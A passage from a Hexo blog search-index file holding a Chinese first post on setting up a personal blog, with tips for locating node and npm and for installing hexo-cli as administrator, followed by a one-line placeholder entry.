        <content type="html"><![CDATA[<p>来由：昨天在学习的时候，意外看到了好多厉害的师傅们都有一个自己的博客，来记录自己的生活以及学习笔记等等，虽然我之前也一直想做这件事情但始终没有行动，那既然又遇到了，那就开始搭建一个属于自己的博客吧，开创一个属于自己的小窝，欸嘿!</p><p>搭建博客过程中遇到的几个小问题:<br>1.之前已经装过nodejs了，不知道路径，这样可以查到具体路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Windows查询:</span><br><span class="line">where node</span><br><span class="line">where npm</span><br><span class="line">Bash查询:</span><br><span class="line">which node</span><br><span class="line">which npm</span><br></pre></td></tr></table></figure><p>2.输入 npm install -g hexo-cli的时候，需要以管理员身份运行</p><p>毕竟每个人遇到的问题都可能不太一样，到时候，希望大家耐心搭建，一定坚持下去呀。</p><p>参考博客：<a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">https://blog.csdn.net/sinat_37781304/article/details/82729029</a></p><p><a href="https://blog.csdn.net/ItDaChuang/article/details/111261426">https://blog.csdn.net/ItDaChuang/article/details/111261426</a></p><p>今后就正式开始以博客的形式来记录啦，希望能够看到自己的成长吧。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>paper</title>
      <link href="/2024/05/19/paper/"/>
      <url>/2024/05/19/paper/</url>
      
        <content type="html"><![CDATA[<p>Fighting!!1</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
